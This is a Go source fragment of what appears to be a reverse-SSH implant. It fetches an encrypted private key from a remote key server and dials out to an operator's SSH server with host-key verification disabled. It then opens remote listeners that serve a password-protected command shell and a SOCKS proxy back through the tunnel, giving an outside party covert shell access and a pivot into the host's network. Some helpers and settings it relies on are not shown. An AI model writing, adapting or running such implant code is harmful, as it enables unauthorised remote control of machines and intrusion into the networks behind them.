/*

*/

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"golang.org/x/crypto/ssh"
)


func main() {

	resp, err := http.Get(serverUserKeyUrl)
	if err != nil {
		fmt.Println("Key Server not accessible")
		os.Exit(1)
	}
	defer resp.Body.Close()
	eKeyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Key Server response not understood")
		os.Exit(2)
	}

	key := decrypt(eKeyBytes, serverUserKeyPassphrase)

	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatalf("Unable to parse private key: %v", err)
	}

	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: serverUser,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		// HostKeyCallback: ssh.FixedHostKey(hostKey),
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to SSH remote server using serverEndpoint (port 22)
	serverConn, err := ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
	if err != nil {
		log.Fatalln(fmt.Printf("Dial INTO remote server error: %s", err))
	}

	// Listen on remote server port - CMD
	listener, err := serverConn.Listen("tcp", remoteEndpoint.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Listen on remote server port - SOCKS
	listenerS, err := serverConn.Listen("tcp", remoteEndpointSOCKS.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Do not verify originating agent acting as ssh server fingerprint
	config := &ssh.ServerConfig{
		//NoClientAuth: true,
		//Provide an additional level of protection for remote SSH shell
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			// Should use constant-time compare (or better, salt+hash) in
			// a production setting.
			if c.User() == remoteCmdUser && string(pass) == remoteCmdPwd {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
	}
	// use the same private key
	config.AddHostKey(signer)

	// accept SOCKS listener
	go acceptSLoop(listenerS)
	// accept SSH shell
	acceptLoop(listener, config)

}
